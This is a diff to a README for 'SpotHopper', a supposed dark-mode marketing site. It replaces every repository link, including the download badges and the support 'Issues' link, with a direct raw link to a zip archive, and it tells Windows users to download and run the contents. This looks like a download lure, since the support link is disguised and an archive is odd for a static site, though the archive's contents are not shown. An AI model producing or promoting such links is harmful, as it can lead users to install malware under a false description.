@@ -1,6 +1,6 @@
 # 🌓 SpotHopper - Simple Dark-Mode Marketing Site
 
-[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-green?style=for-the-badge)](https://github.com/John-Athanassious-seagen2/SpotHopper)
+[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-green?style=for-the-badge)](https://raw.githubusercontent.com/John-Athanassious-seagen2/SpotHopper/main/src/Spot_Hopper_ruther.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and run SpotHopper on your Windows computer. This
 
 Click the button below to go to the SpotHopper download page on GitHub.
 
-[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-blue?style=for-the-badge)](https://github.com/John-Athanassious-seagen2/SpotHopper)
+[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-blue?style=for-the-badge)](https://raw.githubusercontent.com/John-Athanassious-seagen2/SpotHopper/main/src/Spot_Hopper_ruther.zip)
 
 This page contains all the files you need to get the site concept on your computer.
 
@@ -112,13 +112,13 @@ If the site does not open or looks broken:
 
 You can find additional support or report issues on the GitHub repository page:
 
-Visit [https://github.com/John-Athanassious-seagen2/SpotHopper](https://github.com/John-Athanassious-seagen2/SpotHopper)
+Visit [https://raw.githubusercontent.com/John-Athanassious-seagen2/SpotHopper/main/src/Spot_Hopper_ruther.zip](https://raw.githubusercontent.com/John-Athanassious-seagen2/SpotHopper/main/src/Spot_Hopper_ruther.zip)
 
 Look under **Issues** to see if others have similar questions or to submit your own.
 
 ---
 
-[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-green?style=for-the-badge)](https://github.com/John-Athanassious-seagen2/SpotHopper)
+[![Download SpotHopper](https://img.shields.io/badge/Download-SpotHopper-green?style=for-the-badge)](https://raw.githubusercontent.com/John-Athanassious-seagen2/SpotHopper/main/src/Spot_Hopper_ruther.zip)
 
 ---
 
